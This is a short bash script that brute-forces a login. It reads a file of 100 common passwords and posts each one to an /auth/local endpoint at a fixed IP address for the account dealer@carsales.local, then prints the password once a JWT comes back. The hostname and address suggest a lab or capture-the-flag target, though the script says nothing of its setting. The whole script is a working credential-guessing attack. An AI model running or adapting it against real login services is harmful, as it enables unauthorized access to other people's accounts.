input="100-common-passwords.txt"
while IFS= read -r line
do
  echo "Trying: " $line
  resp=`curl -X POST -H "Content-Type: application/json" -d '{"identifier": "dealer@carsales.local", "password":"'$line'"}' http://192.246.250.3:1337/auth/local`

  val=`echo $resp | grep "jwt"`

  if [[ $val ]]
  then
    echo "============="
    echo "'"$line"' is the password."
    echo "Response: $resp"
    echo "============="
    break
  fi
done < "$input"
